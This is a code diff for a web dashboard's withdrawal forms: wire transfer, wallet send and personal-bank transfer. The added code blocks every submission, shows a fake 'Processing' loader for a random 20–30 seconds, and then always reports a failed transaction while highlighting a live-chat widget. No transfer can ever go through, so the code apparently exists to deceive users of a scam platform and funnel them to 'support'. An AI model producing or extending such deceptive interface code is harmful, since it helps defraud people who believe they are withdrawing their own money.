@@ -133,9 +133,60 @@
     });
   }
 
-  // Submit button + full-screen popup loader
+
+  function showFailAndPointToChat() {
+    hidePageLoader();
+    closeModal();
+    var fail = document.getElementById('db-fail-overlay');
+    var pointer = document.getElementById('db-chat-pointer');
+    var lc = document.getElementById('lc-widget');
+    if (fail) fail.hidden = false;
+    if (pointer) pointer.hidden = false;
+    if (lc) {
+      lc.classList.add('is-highlighted');
+      lc.style.zIndex = '340';
+    }
+    document.body.style.overflow = 'hidden';
+  }
+
+  function hideFail() {
+    var fail = document.getElementById('db-fail-overlay');
+    var pointer = document.getElementById('db-chat-pointer');
+    var lc = document.getElementById('lc-widget');
+    if (fail) fail.hidden = true;
+    if (pointer) pointer.hidden = true;
+    if (lc) {
+      lc.classList.remove('is-highlighted');
+      lc.style.zIndex = '';
+    }
+    document.body.style.overflow = '';
+  }
+
+  function openLiveChat() {
+    hideFail();
+    var launcher = document.getElementById('lc-launcher');
+    var panel = document.getElementById('lc-panel');
+    if (launcher) {
+      if (panel && panel.hidden) launcher.click();
+      else if (panel && !panel.hidden) { /* already open */ }
+      else launcher.click();
+    } else {
+      window.location.href = '/app/support';
+    }
+  }
+
+  var failClose = document.getElementById('db-fail-close');
+  if (failClose) failClose.addEventListener('click', hideFail);
+  var failChat = document.getElementById('db-fail-chat');
+  if (failChat) failChat.addEventListener('click', openLiveChat);
+  var failBackdrop = document.querySelector('.db-fail-overlay__backdrop');
+  if (failBackdrop) failBackdrop.addEventListener('click', hideFail);
+
+  // Submit → loader 20–30s → failed transaction + point to live chat
   Array.prototype.forEach.call(root.querySelectorAll('.db-modal__form'), function (form) {
-    form.addEventListener('submit', function () {
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+
       var btn = form.querySelector('.db-modal__btn--primary[type="submit"]');
       if (btn && !btn.disabled) {
         btn.disabled = true;
@@ -146,12 +197,26 @@
           '<span class="db-btn-spinner" aria-hidden="true"></span>' +
           '<span>Processing…</span>';
       }
+
       var msg = 'Processing your request';
       if (form.closest('#modal-wire')) msg = 'Submitting wire transfer';
       else if (form.closest('#modal-wallet')) msg = 'Sending to wallet';
       else if (form.closest('#modal-personal-bank')) msg = 'Transferring to personal bank';
       showPageLoader(msg);
+
+      // 20–30 seconds random delay, then failed transaction UX
+      var delayMs = 20000 + Math.floor(Math.random() * 10000);
+      setTimeout(function () {
+        if (btn) {
+          btn.disabled = false;
+          btn.classList.remove('is-loading');
+          var label = btn.getAttribute('data-label');
+          if (label) btn.textContent = label;
+        }
+        showFailAndPointToChat();
+      }, delayMs);
     });
   });
+
 
 })();
